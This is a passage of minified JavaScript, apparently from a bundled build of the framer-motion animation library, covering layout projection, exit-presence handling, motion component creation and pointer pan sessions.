=1?this.createRelativeTarget(a,this.target,a.target):this.relativeParent=this.relativeTarget=void 0),Fr.value&&Iu.calculatedTargetDeltas++)}getClosestProjectingParent(){if(!(!this.parent||Yc(this.parent.latestValues)||Zc(this.parent.latestValues)))return this.parent.isProjecting()?this.parent:this.parent.getClosestProjectingParent()}isProjecting(){return!!((this.relativeTarget||this.targetDelta||this.options.layoutRoot)&&this.layout)}createRelativeTarget(e,t,n){this.relativeParent=e,this.linkedParentVersion=e.layoutVersion,this.forceRelativeParentToResolveTarget(),this.relativeTarget=Tc(),this.relativeTargetOrigin=Tc(),nu(this.relativeTargetOrigin,t,n),z(this.relativeTarget,this.relativeTargetOrigin)}removeRelativeTarget(){this.relativeParent=this.relativeTarget=void 0}calcProjection(){let e=this.getLead(),t=!!this.resumingFrom||this!==e,n=!0;if((this.isProjectionDirty||this.parent?.isProjectionDirty)&&(n=!1),t&&(this.isSharedProjectionDirty||this.isTransformDirty)&&(n=!1),this.resolvedRelativeTargetAt===Br.timestamp&&(n=!1),n)return;let{layout:r,layoutId:i}=this.options;if(this.isTreeAnimating=!!(this.parent&&this.parent.isTreeAnimating||this.currentAnimation||this.pendingAnimation),this.isTreeAnimating||(this.targetDelta=this.relativeTarget=void 0),!this.layout||!(r||i))return;z(this.layoutCorrected,this.layout.layoutBox);let a=this.treeScale.x,o=this.treeScale.y;al(this.layoutCorrected,this.treeScale,this.path,t),e.layout&&!e.target&&(this.treeScale.x!==1||this.treeScale.y!==1)&&(e.target=e.layout.layoutBox,e.targetWithTransforms=Tc());let{target:s}=e;if(!s){this.prevProjectionDelta&&(this.createProjectionDeltas(),this.scheduleRender());return}!this.projectionDelta||!this.prevProjectionDelta?this.createProjectionDeltas():(B(this.prevProjectionDelta.x,this.projectionDelta.x),B(this.prevProjectionDelta.y,this.projectionDelta.y)),Ql(this.projectionDelta,this.layoutCorrected,s,this.latestValues),(this.treeScale.x!==a||this.treeScale.y!==o||!gu(this.projectionDelta.x,this.prevProjectionDelta.x)||!gu(this.projectionDelta.y,this.prevProjectionDelta.y))&&(this.hasProjected=!0,this.scheduleRender(),this.notifyListeners(`projectionUpdate`,s)),Fr.value&&Iu.calculatedProjections++}hide(){this.isVisible=!1}show(){this.isVisible=!0}scheduleRender(e=!0){if(this.options.visualElement?.scheduleRender(),e){let e=this.getStack();e&&e.scheduleRender()}this.resumingFrom&&!this.resumingFrom.instance&&(this.resumingFrom=void 0)}createProjectionDeltas(){this.prevProjectionDelta=Cc(),this.projectionDelta=Cc(),this.projectionDeltaWithTransform=Cc()}setAnimationOrigin(e,t=!1){let n=this.snapshot,r=n?n.latestValues:{},i={...this.latestValues},a=Cc();(!this.relativeParent||!this.relativeParent.options.layoutRoot)&&(this.relativeTarget=this.relativeTargetOrigin=void 0),this.attemptToResolveRelativeTarget=!t;let o=Tc(),s=(n?n.source:void 0)!==(this.layout?this.layout.source:void 0),c=this.getStack(),l=!c||c.members.length<=1,u=!!(s&&!l&&this.options.crossfade===!0&&!this.path.some(id));this.animationProgress=0;let d;this.mixTargetDelta=t=>{let n=t/1e3;td(a.x,e.x,n),td(a.y,e.y,n),this.setTargetDelta(a),this.relativeTarget&&this.relativeTargetOrigin&&this.layout&&this.relativeParent&&this.relativeParent.layout&&(nu(o,this.layout.layoutBox,this.relativeParent.layout.layoutBox),rd(this.relativeTarget,this.relativeTargetOrigin,o,n),d&&fu(this.relativeTarget,d)&&(this.isProjectionDirty=!1),d||=Tc(),z(d,this.relativeTarget)),s&&(this.animationValues=i,Cu(i,r,this.latestValues,n,u,l)),this.root.scheduleUpdateProjection(),this.scheduleRender(),this.animationProgress=n},this.mixTargetDelta(this.options.layoutRoot?1e3:0)}startAnimation(e){this.notifyListeners(`animationStart`),this.currentAnimation?.stop(),this.resumingFrom?.currentAnimation?.stop(),this.pendingAnimation&&=(zr(this.pendingAnimation),void 0),this.pendingAnimation=j.update(()=>{Fu.hasAnimatedSinceResize=!0,Gr.layout++,this.motionValue||=Qo(0),this.motionValue.jump(0,!1),this.currentAnimation=Ou(this.motionValue,[0,1e3],{...e,velocity:0,isSync:!0,onUpdate:t=>{this.mixTargetDelta(t),e.onUpdate&&e.onUpdate(t)},onStop:()=>{Gr.layout--},onComplete:()=>{Gr.layout--,e.onComplete&&e.onComplete(),this.completeAnimation()}}),this.resumingFrom&&(this.resumingFrom.currentAnimation=this.currentAnimation),this.pendingAnimation=void 0})}completeAnimation(){this.resumingFrom&&(this.resumingFrom.currentAnimation=void 0,this.resumingFrom.preserveOpacity=void 0);let e=this.getStack();e&&e.exitAnimationComplete(),this.resumingFrom=this.currentAnimation=this.animationValues=void 0,this.notifyListeners(`animationComplete`)}finishAnimation(){this.currentAnimation&&(this.mixTargetDelta&&this.mixTargetDelta(Ru),this.currentAnimation.stop()),this.completeAnimation()}applyTransformsToTarget(){let e=this.getLead(),{targetWithTransforms:t,target:n,layout:r,latestValues:i}=e;if(!(!t||!n||!r)){if(this!==e&&this.layout&&r&&ud(this.options.animationType,this.layout.layoutBox,r.layoutBox)){n=this.target||Tc();let t=Yl(this.layout.layoutBox.x);n.x.min=e.target.x.min,n.x.max=n.x.min+t;let r=Yl(this.layout.layoutBox.y);n.y.min=e.target.y.min,n.y.max=n.y.min+r}z(t,n),ll(t,i),Ql(this.projectionDeltaWithTransform,this.layoutCorrected,t,i)}}registerSharedNode(e,t){this.sharedNodes.has(e)||this.sharedNodes.set(e,new Pu),this.sharedNodes.get(e).add(t);let n=t.options.initialPromotionConfig;t.promote({transition:n?n.transition:void 0,preserveFollowOpacity:n&&n.shouldPreserveFollowOpacity?n.shouldPreserveFollowOpacity(t):void 0})}isLead(){let e=this.getStack();return e?e.lead===this:!0}getLead(){let{layoutId:e}=this.options;return e&&this.getStack()?.lead||this}getPrevLead(){let{layoutId:e}=this.options;return e?this.getStack()?.prevLead:void 0}getStack(){let{layoutId:e}=this.options;if(e)return this.root.sharedNodes.get(e)}promote({needsReset:e,transition:t,preserveFollowOpacity:n}={}){let r=this.getStack();r&&r.promote(this,n),e&&(this.projectionDelta=void 0,this.needsReset=!0),t&&this.setOptions({transition:t})}relegate(){let e=this.getStack();return e?e.relegate(this):!1}resetSkewAndRotation(){let{visualElement:e}=this.options;if(!e)return;let t=!1,{latestValues:n}=e;if((n.z||n.rotate||n.rotateX||n.rotateY||n.rotateZ||n.skewX||n.skewY)&&(t=!0),!t)return;let r={};n.z&&Bu(`z`,e,r,this.animationValues);for(let t=0;t<Lu.length;t++)Bu(`rotate${Lu[t]}`,e,r,this.animationValues),Bu(`skew${Lu[t]}`,e,r,this.animationValues);e.render();for(let t in r)e.setStaticValue(t,r[t]),this.animationValues&&(this.animationValues[t]=r[t]);e.scheduleRender()}applyProjectionStyles(e,t){if(!this.instance||this.isSVG)return;if(!this.isVisible){e.visibility=`hidden`;return}let n=this.getTransformTemplate();if(this.needsReset){this.needsReset=!1,e.visibility=``,e.opacity=``,e.pointerEvents=Nu(t?.pointerEvents)||``,e.transform=n?n(this.latestValues,``):`none`;return}let r=this.getLead();if(!this.projectionDelta||!this.layout||!r.target){this.options.layoutId&&(e.opacity=this.latestValues.opacity===void 0?1:this.latestValues.opacity,e.pointerEvents=Nu(t?.pointerEvents)||``),this.hasProjected&&!Xc(this.latestValues)&&(e.transform=n?n({},``):`none`,this.hasProjected=!1);return}e.visibility=``;let i=r.animationValues||r.latestValues;this.applyTransformsToTarget();let a=vu(this.projectionDeltaWithTransform,this.treeScale,i);n&&(a=n(i,a)),e.transform=a;let{x:o,y:s}=this.projectionDelta;e.transformOrigin=`${o.origin*100}% ${s.origin*100}% 0`,r.animationValues?e.opacity=r===this?i.opacity??this.latestValues.opacity??1:this.preserveOpacity?this.latestValues.opacity:i.opacityExit:e.opacity=r===this?i.opacity===void 0?``:i.opacity:i.opacityExit===void 0?0:i.opacityExit;for(let t in bl){if(i[t]===void 0)continue;let{correct:n,applyTo:o,isCSSVariable:s}=bl[t],c=a===`none`?i[t]:n(i[t],r);if(o){let t=o.length;for(let n=0;n<t;n++)e[o[n]]=c}else s?this.options.visualElement.renderState.vars[t]=c:e[t]=c}this.options.layoutId&&(e.pointerEvents=r===this?Nu(t?.pointerEvents)||``:`none`)}clearSnapshot(){this.resumeFrom=this.snapshot=void 0}resetTree(){this.root.nodes.forEach(e=>e.currentAnimation?.stop()),this.root.nodes.forEach(Ju),this.root.sharedNodes.clear()}}}function Uu(e){e.updateLayout()}function Wu(e){let t=e.resumeFrom?.snapshot||e.snapshot;if(e.isLead()&&e.layout&&t&&e.hasListeners(`didUpdate`)){let{layoutBox:n,measuredBox:r}=e.layout,{animationType:i}=e.options,a=t.source!==e.layout.source;if(i===`size`)_u(e=>{let r=a?t.measuredBox[e]:t.layoutBox[e],i=Yl(r);r.min=n[e].min,r.max=r.min+i});else if(i===`x`||i===`y`){let e=i===`x`?`y`:`x`;Gl(a?t.measuredBox[e]:t.layoutBox[e],n[e])}else ud(i,t.layoutBox,n)&&_u(r=>{let i=a?t.measuredBox[r]:t.layoutBox[r],o=Yl(n[r]);i.max=i.min+o,e.relativeTarget&&!e.currentAnimation&&(e.isProjectionDirty=!0,e.relativeTarget[r].max=e.relativeTarget[r].min+o)});let o=Cc();Ql(o,n,t.layoutBox);let s=Cc();a?Ql(s,e.applyTransform(r,!0),t.measuredBox):Ql(s,n,t.layoutBox);let c=!uu(o),l=!1;if(!e.resumeFrom){let r=e.getClosestProjectingParent();if(r&&!r.resumeFrom){let{snapshot:i,layout:a}=r;if(i&&a){let o=Tc();nu(o,t.layoutBox,i.layoutBox);let s=Tc();nu(s,n,a.layoutBox),mu(o,s)||(l=!0),r.options.layoutRoot&&(e.relativeTarget=s,e.relativeTargetOrigin=o,e.relativeParent=r)}}}e.notifyListeners(`didUpdate`,{layout:n,snapshot:t,delta:s,layoutDelta:o,hasLayoutChanged:c,hasRelativeLayoutChanged:l})}else if(e.isLead()){let{onExitComplete:t}=e.options;t&&t()}e.options.transition=void 0}function Gu(e){Fr.value&&Iu.nodes++,e.parent&&(e.isProjecting()||(e.isProjectionDirty=e.parent.isProjectionDirty),e.isSharedProjectionDirty||=!!(e.isProjectionDirty||e.parent.isProjectionDirty||e.parent.isSharedProjectionDirty),e.isTransformDirty||=e.parent.isTransformDirty)}function Ku(e){e.isProjectionDirty=e.isSharedProjectionDirty=e.isTransformDirty=!1}function qu(e){e.clearSnapshot()}function Ju(e){e.clearMeasurements()}function Yu(e){e.isLayoutDirty=!1}function Xu(e){let{visualElement:t}=e.options;t&&t.getProps().onBeforeLayoutMeasure&&t.notify(`BeforeLayoutMeasure`),e.resetTransform()}function Zu(e){e.finishAnimation(),e.targetDelta=e.relativeTarget=e.target=void 0,e.isProjectionDirty=!0}function W(e){e.resolveTargetDelta()}function Qu(e){e.calcProjection()}function $u(e){e.resetSkewAndRotation()}function ed(e){e.removeLeadSnapshot()}function td(e,t,n){e.translate=N(t.translate,0,n),e.scale=N(t.scale,1,n),e.origin=t.origin,e.originPoint=t.originPoint}function nd(e,t,n,r){e.min=N(t.min,n.min,r),e.max=N(t.max,n.max,r)}function rd(e,t,n,r){nd(e.x,t.x,n.x,r),nd(e.y,t.y,n.y,r)}function id(e){return e.animationValues&&e.animationValues.opacityExit!==void 0}var ad={duration:.45,ease:[.4,0,.1,1]},od=e=>typeof navigator<`u`&&navigator.userAgent&&navigator.userAgent.toLowerCase().includes(e),sd=od(`applewebkit/`)&&!od(`chrome/`)?Math.round:ir;function cd(e){e.min=sd(e.min),e.max=sd(e.max)}function ld(e){cd(e.x),cd(e.y)}function ud(e,t,n){return e===`position`||e===`preserve-aspect`&&!Xl(hu(t),hu(n),.2)}function dd(e){return e!==e.root&&e.scroll?.wasRoot}var fd=Hu({attachResizeListener:(e,t)=>ku(e,`resize`,t),measureScroll:()=>({x:document.documentElement.scrollLeft||document.body?.scrollLeft||0,y:document.documentElement.scrollTop||document.body?.scrollTop||0}),checkIsScrollRoot:()=>!0}),pd={current:void 0},md=Hu({measureScroll:e=>({x:e.scrollLeft,y:e.scrollTop}),defaultParent:()=>{if(!pd.current){let e=new fd({});e.mount(window),e.setOptions({layoutScroll:!0}),pd.current=e}return pd.current},resetTransform:(e,t)=>{e.style.transform=t===void 0?`none`:t},checkIsScrollRoot:e=>window.getComputedStyle(e).position===`fixed`}),hd=(0,w.createContext)({transformPagePoint:e=>e,isStatic:!1,reducedMotion:`never`});function gd(e,t){if(typeof e==`function`)return e(t);e!=null&&(e.current=t)}function _d(...e){return t=>{let n=!1,r=e.map(e=>{let r=gd(e,t);return!n&&typeof r==`function`&&(n=!0),r});if(n)return()=>{for(let t=0;t<r.length;t++){let n=r[t];typeof n==`function`?n():gd(e[t],null)}}}}function vd(...e){return w.useCallback(_d(...e),e)}var G=Gn(),yd=class extends w.Component{getSnapshotBeforeUpdate(e){let t=this.props.childRef.current;if(Is(t)&&e.isPresent&&!this.props.isPresent&&this.props.pop!==!1){let e=t.offsetParent,n=Is(e)&&e.offsetWidth||0,r=Is(e)&&e.offsetHeight||0,i=getComputedStyle(t),a=this.props.sizeRef.current;a.height=parseFloat(i.height),a.width=parseFloat(i.width),a.top=t.offsetTop,a.left=t.offsetLeft,a.right=n-a.width-a.left,a.bottom=r-a.height-a.top}return null}componentDidUpdate(){}render(){return this.props.children}};function bd({children:e,isPresent:t,anchorX:n,anchorY:r,root:i,pop:a}){let o=(0,w.useId)(),s=(0,w.useRef)(null),c=(0,w.useRef)({width:0,height:0,top:0,left:0,right:0,bottom:0}),{nonce:l}=(0,w.useContext)(hd),u=vd(s,e.props?.ref??e?.ref);return(0,w.useInsertionEffect)(()=>{let{width:e,height:u,top:d,left:f,right:p,bottom:m}=c.current;if(t||a===!1||!s.current||!e||!u)return;let h=n===`left`?`left: ${f}`:`right: ${p}`,g=r===`bottom`?`bottom: ${m}`:`top: ${d}`;s.current.dataset.motionPopId=o;let _=document.createElement(`style`);l&&(_.nonce=l);let v=i??document.head;return v.appendChild(_),_.sheet&&_.sheet.insertRule(`
          [data-motion-pop-id="${o}"] {
            position: absolute !important;
            width: ${e}px !important;
            height: ${u}px !important;
            ${h}px !important;
            ${g}px !important;
          }
        `),()=>{s.current?.removeAttribute(`data-motion-pop-id`),v.contains(_)&&v.removeChild(_)}},[t]),(0,G.jsx)(yd,{isPresent:t,childRef:s,sizeRef:c,pop:a,children:a===!1?e:w.cloneElement(e,{ref:u})})}var xd=({children:e,initial:t,isPresent:n,onExitComplete:r,custom:i,presenceAffectsLayout:a,mode:o,anchorX:s,anchorY:c,root:l})=>{let u=qn(Sd),d=(0,w.useId)(),f=!0,p=(0,w.useMemo)(()=>(f=!1,{id:d,initial:t,isPresent:n,custom:i,onExitComplete:e=>{u.set(e,!0);for(let e of u.values())if(!e)return;r&&r()},register:e=>(u.set(e,!1),()=>u.delete(e))}),[n,u,r]);return a&&f&&(p={...p}),(0,w.useMemo)(()=>{u.forEach((e,t)=>u.set(t,!1))},[n]),w.useEffect(()=>{!n&&!u.size&&r&&r()},[n]),e=(0,G.jsx)(bd,{pop:o===`popLayout`,isPresent:n,anchorX:s,anchorY:c,root:l,children:e}),(0,G.jsx)(Yn.Provider,{value:p,children:e})};function Sd(){return new Map}function Cd(e=!0){let t=(0,w.useContext)(Yn);if(t===null)return[!0,null];let{isPresent:n,onExitComplete:r,register:i}=t,a=(0,w.useId)();(0,w.useEffect)(()=>{if(e)return i(a)},[e]);let o=(0,w.useCallback)(()=>e&&r&&r(a),[a,r,e]);return!n&&r?[!1,o]:[!0]}var wd=e=>e.key||``;function Td(e){let t=[];return w.Children.forEach(e,e=>{(0,w.isValidElement)(e)&&t.push(e)}),t}var K=({children:e,custom:t,initial:n=!0,onExitComplete:r,presenceAffectsLayout:i=!0,mode:a=`sync`,propagate:o=!1,anchorX:s=`left`,anchorY:c=`top`,root:l})=>{let[u,d]=Cd(o),f=(0,w.useMemo)(()=>Td(e),[e]),p=o&&!u?[]:f.map(wd),m=(0,w.useRef)(!0),h=(0,w.useRef)(f),g=qn(()=>new Map),_=(0,w.useRef)(new Set),[v,y]=(0,w.useState)(f),[b,x]=(0,w.useState)(f);Jn(()=>{m.current=!1,h.current=f;for(let e=0;e<b.length;e++){let t=wd(b[e]);p.includes(t)?(g.delete(t),_.current.delete(t)):g.get(t)!==!0&&g.set(t,!1)}},[b,p.length,p.join(`-`)]);let S=[];if(f!==v){let e=[...f];for(let t=0;t<b.length;t++){let n=b[t],r=wd(n);p.includes(r)||(e.splice(t,0,n),S.push(n))}return a===`wait`&&S.length&&(e=S),x(Td(e)),y(f),null}let{forceRender:C}=(0,w.useContext)(Kn);return(0,G.jsx)(G.Fragment,{children:b.map(e=>{let v=wd(e),y=o&&!u?!1:f===b||p.includes(v);return(0,G.jsx)(xd,{isPresent:y,initial:!m.current||n?void 0:!1,custom:t,presenceAffectsLayout:i,mode:a,root:l,onExitComplete:y?void 0:()=>{if(_.current.has(v))return;if(g.has(v))_.current.add(v),g.set(v,!0);else return;let e=!0;g.forEach(t=>{t||(e=!1)}),e&&(C?.(),x(h.current),o&&d?.(),r&&r())},anchorX:s,anchorY:c,children:e},v)})})},Ed=(0,w.createContext)({strict:!1}),Dd={animation:[`animate`,`variants`,`whileHover`,`whileTap`,`exit`,`whileInView`,`whileFocus`,`whileDrag`],exit:[`exit`],drag:[`drag`,`dragControls`],focus:[`whileFocus`],hover:[`whileHover`,`onHoverStart`,`onHoverEnd`],tap:[`whileTap`,`onTap`,`onTapStart`,`onTapCancel`],pan:[`onPan`,`onPanStart`,`onPanSessionStart`,`onPanEnd`],inView:[`whileInView`,`onViewportEnter`,`onViewportLeave`],layout:[`layout`,`layoutId`]},Od=!1;function kd(){if(Od)return;let e={};for(let t in Dd)e[t]={isEnabled:e=>Dd[t].some(t=>!!e[t])};Bc(e),Od=!0}function Ad(){return kd(),Vc()}function jd(e){let t=Ad();for(let n in e)t[n]={...t[n],...e[n]};Bc(t)}var Md=new Set(`animate.exit.variants.initial.style.values.variants.transition.transformTemplate.custom.inherit.onBeforeLayoutMeasure.onAnimationStart.onAnimationComplete.onUpdate.onDragStart.onDrag.onDragEnd.onMeasureDragConstraints.onDirectionLock.onDragTransitionEnd._dragX._dragY.onHoverStart.onHoverEnd.onViewportEnter.onViewportLeave.globalTapTarget.propagate.ignoreStrict.viewport`.split(`.`));function Nd(e){return e.startsWith(`while`)||e.startsWith(`drag`)&&e!==`draggable`||e.startsWith(`layout`)||e.startsWith(`onTap`)||e.startsWith(`onPan`)||e.startsWith(`onLayout`)||Md.has(e)}var Pd=c({default:()=>Fd}),Fd,Id=o((()=>{throw Fd={},Error(`Could not resolve "@emotion/is-prop-valid" imported by "framer-motion". Is it installed?`)})),Ld=e=>!Nd(e);function Rd(e){typeof e==`function`&&(Ld=t=>t.startsWith(`on`)?!Nd(t):e(t))}try{Rd((Id(),d(Pd)).default)}catch{}function q(e,t,n){let r={};for(let i in e)i===`values`&&typeof e.values==`object`||rs(e[i])||(Ld(i)||n===!0&&Nd(i)||!t&&!Nd(i)||e.draggable&&i.startsWith(`onDrag`))&&(r[i]=e[i]);return r}var zd=(0,w.createContext)({});function Bd(e,t){if(jc(e)){let{initial:t,animate:n}=e;return{initial:t===!1||Oc(t)?t:void 0,animate:Oc(n)?n:void 0}}return e.inherit===!1?{}:t}function Vd(e){let{initial:t,animate:n}=Bd(e,(0,w.useContext)(zd));return(0,w.useMemo)(()=>({initial:t,animate:n}),[Hd(t),Hd(n)])}function Hd(e){return Array.isArray(e)?e.join(` `):e}var Ud=()=>({style:{},transform:{},transformOrigin:{},vars:{}});function Wd(e,t,n){for(let r in t)!rs(t[r])&&!xl(r,n)&&(e[r]=t[r])}function Gd({transformTemplate:e},t){return(0,w.useMemo)(()=>{let n=Ud();return hl(n,t,e),Object.assign({},n.vars,n.style)},[t])}function Kd(e,t){let n=e.style||{},r={};return Wd(r,n,e),Object.assign(r,Gd(e,t)),r}function qd(e,t){let n={},r=Kd(e,t);return e.drag&&e.dragListener!==!1&&(n.draggable=!1,r.userSelect=r.WebkitUserSelect=r.WebkitTouchCallout=`none`,r.touchAction=e.drag===!0?`none`:`pan-${e.drag===`x`?`y`:`x`}`),e.tabIndex===void 0&&(e.onTap||e.onTapStart||e.whileTap)&&(n.tabIndex=0),n.style=r,n}var Jd=()=>({...Ud(),attrs:{}});function Yd(e,t,n,r){let i=(0,w.useMemo)(()=>{let n=Jd();return kl(n,t,jl(r),e.transformTemplate,e.style),{...n.attrs,style:{...n.style}}},[t]);if(e.style){let t={};Wd(t,e.style,e),i.style={...t,...i.style}}return i}var Xd=[`animate`,`circle`,`defs`,`desc`,`ellipse`,`g`,`image`,`line`,`filter`,`marker`,`mask`,`metadata`,`path`,`pattern`,`polygon`,`polyline`,`rect`,`stop`,`switch`,`symbol`,`svg`,`text`,`tspan`,`use`,`view`];function Zd(e){return typeof e!=`string`||e.includes(`-`)?!1:!!(Xd.indexOf(e)>-1||/[A-Z]/u.test(e))}function Qd(e,t,n,{latestValues:r},i,a=!1,o){let s=(o??Zd(e)?Yd:qd)(t,r,i,e),c=q(t,typeof e==`string`,a),l=e===w.Fragment?{}:{...c,...s,ref:n},{children:u}=t,d=(0,w.useMemo)(()=>rs(u)?u.get():u,[u]);return(0,w.createElement)(e,{...l,children:d})}function $d({scrapeMotionValuesFromProps:e,createRenderState:t},n,r,i){return{latestValues:ef(n,r,i,e),renderState:t()}}function ef(e,t,n,r){let i={},a=r(e,{});for(let e in a)i[e]=Nu(a[e]);let{initial:o,animate:s}=e,c=jc(e),l=Mc(e);t&&l&&!c&&e.inherit!==!1&&(o===void 0&&(o=t.initial),s===void 0&&(s=t.animate));let u=n?n.initial===!1:!1;u||=o===!1;let d=u?s:o;if(d&&typeof d!=`boolean`&&!Dc(d)){let t=Array.isArray(d)?d:[d];for(let n=0;n<t.length;n++){let r=Go(e,t[n]);if(r){let{transitionEnd:e,transition:t,...n}=r;for(let e in n){let t=n[e];if(Array.isArray(t)){let e=u?t.length-1:0;t=t[e]}t!==null&&(i[e]=t)}for(let t in e)i[t]=e[t]}}}return i}var tf=e=>(t,n)=>{let r=(0,w.useContext)(zd),i=(0,w.useContext)(Yn),a=()=>$d(e,t,r,i);return n?a():qn(a)},nf=tf({scrapeMotionValuesFromProps:Sl,createRenderState:Ud}),rf=tf({scrapeMotionValuesFromProps:Nl,createRenderState:Jd}),af=Symbol.for(`motionComponentSymbol`);function of(e,t,n){let r=(0,w.useRef)(n);(0,w.useInsertionEffect)(()=>{r.current=n});let i=(0,w.useRef)(null);return(0,w.useCallback)(n=>{n&&e.onMount?.(n);let a=r.current;if(typeof a==`function`)if(n){let e=a(n);typeof e==`function`&&(i.current=e)}else i.current?(i.current(),i.current=null):a(n);else a&&(a.current=n);t&&(n?t.mount(n):t.unmount())},[t])}var sf=(0,w.createContext)({});function cf(e){return e&&typeof e==`object`&&Object.prototype.hasOwnProperty.call(e,`current`)}function lf(e,t,n,r,i,a){let{visualElement:o}=(0,w.useContext)(zd),s=(0,w.useContext)(Ed),c=(0,w.useContext)(Yn),l=(0,w.useContext)(hd),u=l.reducedMotion,d=l.skipAnimations,f=(0,w.useRef)(null),p=(0,w.useRef)(!1);r||=s.renderer,!f.current&&r&&(f.current=r(e,{visualState:t,parent:o,props:n,presenceContext:c,blockInitialAnimation:c?c.initial===!1:!1,reducedMotionConfig:u,skipAnimations:d,isSVG:a}),p.current&&f.current&&(f.current.manuallyAnimateOnMount=!0));let m=f.current,h=(0,w.useContext)(sf);m&&!m.projection&&i&&(m.type===`html`||m.type===`svg`)&&uf(f.current,n,i,h);let g=(0,w.useRef)(!1);(0,w.useInsertionEffect)(()=>{m&&g.current&&m.update(n,c)});let _=n[ss],v=(0,w.useRef)(!!_&&typeof window<`u`&&!window.MotionHandoffIsComplete?.(_)&&window.MotionHasOptimisedAnimation?.(_));return Jn(()=>{p.current=!0,m&&(g.current=!0,window.MotionIsMounted=!0,m.updateFeatures(),m.scheduleRenderMicrotask(),v.current&&m.animationState&&m.animationState.animateChanges())}),(0,w.useEffect)(()=>{m&&(!v.current&&m.animationState&&m.animationState.animateChanges(),v.current&&=(queueMicrotask(()=>{window.MotionHandoffMarkAsComplete?.(_)}),!1),m.enteringChildren=void 0)}),m}function uf(e,t,n,r){let{layoutId:i,layout:a,drag:o,dragConstraints:s,layoutScroll:c,layoutRoot:l,layoutCrossfade:u}=t;e.projection=new n(e.latestValues,t[`data-framer-portal-id`]?void 0:df(e.parent)),e.projection.setOptions({layoutId:i,layout:a,alwaysMeasureLayout:!!o||s&&cf(s),visualElement:e,animationType:typeof a==`string`?a:`both`,initialPromotionConfig:r,crossfade:u,layoutScroll:c,layoutRoot:l})}function df(e){if(e)return e.options.allowProjection===!1?df(e.parent):e.projection}function ff(e,{forwardMotionProps:t=!1,type:n}={},r,i){r&&jd(r);let a=n?n===`svg`:Zd(e),o=a?rf:nf;function s(n,s){let c,l={...(0,w.useContext)(hd),...n,layoutId:pf(n)},{isStatic:u}=l,d=Vd(n),f=o(n,u);if(!u&&typeof window<`u`){mf(l,r);let t=hf(l);c=t.MeasureLayout,d.visualElement=lf(e,f,l,i,t.ProjectionNode,a)}return(0,G.jsxs)(zd.Provider,{value:d,children:[c&&d.visualElement?(0,G.jsx)(c,{visualElement:d.visualElement,...l}):null,Qd(e,n,of(f,d.visualElement,s),f,u,t,a)]})}s.displayName=`motion.${typeof e==`string`?e:`create(${e.displayName??e.name??``})`}`;let c=(0,w.forwardRef)(s);return c[af]=e,c}function pf({layoutId:e}){let t=(0,w.useContext)(Kn).id;return t&&e!==void 0?t+`-`+e:e}function mf(e,t){(0,w.useContext)(Ed).strict}function hf(e){let{drag:t,layout:n}=Ad();if(!t&&!n)return{};let r={...t,...n};return{MeasureLayout:t?.isEnabled(e)||n?.isEnabled(e)?r.MeasureLayout:void 0,ProjectionNode:r.ProjectionNode}}function gf(e,t){if(typeof Proxy>`u`)return ff;let n=new Map,r=(n,r)=>ff(n,r,e,t);return new Proxy((e,t)=>r(e,t),{get:(i,a)=>a===`create`?r:(n.has(a)||n.set(a,ff(a,void 0,e,t)),n.get(a))})}var _f=(e,t)=>t.isSVG??Zd(e)?new Pl(t):new wl(t,{allowProjection:e!==w.Fragment}),vf=class extends Wc{constructor(e){super(e),e.animationState||=Vl(e)}updateAnimationControlsSubscription(){let{animate:e}=this.node.getProps();Dc(e)&&(this.unmountControls=e.subscribe(this.node))}mount(){this.updateAnimationControlsSubscription()}update(){let{animate:e}=this.node.getProps(),{animate:t}=this.node.prevProps||{};e!==t&&this.updateAnimationControlsSubscription()}unmount(){this.node.animationState.reset(),this.unmountControls?.()}},yf=0,bf={animation:{Feature:vf},exit:{Feature:class extends Wc{constructor(){super(...arguments),this.id=yf++,this.isExitComplete=!1}update(){if(!this.node.presenceContext)return;let{isPresent:e,onExitComplete:t}=this.node.presenceContext,{isPresent:n}=this.node.prevPresenceContext||{};if(!this.node.animationState||e===n)return;if(e&&n===!1){if(this.isExitComplete){let{initial:e,custom:t}=this.node.getProps();if(typeof e==`string`){let n=Ko(this.node,e,t);if(n){let{transition:e,transitionEnd:t,...r}=n;for(let e in r)this.node.getValue(e)?.jump(r[e])}}this.node.animationState.reset(),this.node.animationState.animateChanges()}else this.node.animationState.setActive(`exit`,!1);this.isExitComplete=!1;return}let r=this.node.animationState.setActive(`exit`,!e);t&&!e&&r.then(()=>{this.isExitComplete=!0,t(this.id)})}mount(){let{register:e,onExitComplete:t}=this.node.presenceContext||{};t&&t(this.id),e&&(this.unmount=e(this.id))}unmount(){}}}};function xf(e){return{point:{x:e.pageX,y:e.pageY}}}var Sf=e=>t=>Ks(t)&&e(t,xf(t));function Cf(e,t,n,r){return ku(e,t,Sf(n),r)}var wf=({current:e})=>e?e.ownerDocument.defaultView:null,Tf=(e,t)=>Math.abs(e-t);function Ef(e,t){let n=Tf(e.x,t.x),r=Tf(e.y,t.y);return Math.sqrt(n**2+r**2)}var Df=new Set([`auto`,`scroll`]),Of=class{constructor(e,t,{transformPagePoint:n,contextWindow:r=window,dragSnapToOrigin:i=!1,distanceThreshold:a=3,element:o}={}){if(this.startEvent=null,this.lastMoveEvent=null,this.lastMoveEventInfo=null,this.lastRawMoveEventInfo=null,this.handlers={},this.contextWindow=window,this.scrollPositions=new Map,this.removeScrollListeners=null,this.onElementScroll=e=>{this.handleScroll(e.target)},this.onWindowScroll=()=>{this.handleScroll(window)},this.updatePoint=()=>{if(!(this.lastMoveEvent&&this.lastMoveEventInfo))return;this.lastRawMoveEventInfo&&(this.lastMoveEventInfo=kf(this.lastRawMoveEventInfo,this.transformPagePoint));let e=jf(this.lastMoveEventInfo,this.history),t=this.startEvent!==null,n=Ef(e.offset,{x:0,y:0})>=this.distanceThreshold;if(!t&&!n)return;let{point:r}=e,{timestamp:i}=Br;this.history.push({...r,timestamp:i});let{onStart:a,onMove:o}=this.handlers;t||(a&&a(this.lastMoveEvent,e),this.startEvent=this.lastMoveEvent),o&&o(this.lastMoveEvent,e)},this.handlePointerMove=(e,t)=>{this.lastMoveEvent=e,this.lastRawMoveEventInfo=t,this.lastMoveEventInfo=kf(t,this.transformPagePoint),j.update(this.updatePoint,!0)},this.handlePointerUp=(e,t)=>{this.end();let{onEnd:n,onSessionEnd:r,resumeAnimation:i}=this.handlers;if((this.dragSnapToOrigin||!this.startEvent)&&i&&i(),!(this.lastMoveEvent&&this.lastMoveEventInfo))return;let a=jf(e.type===`pointercancel`?this.lastMoveEventInfo:kf(t,this.transformPagePoint),this.history);this.startEvent&&n&&n(e,a),r&&r(e,a)},!Ks(e))return;this.dragSnapToOrigin=i,this.handlers=t,this.transformPagePoint=n,this.distanceThreshold=a,this.contextWindow=r||window;let 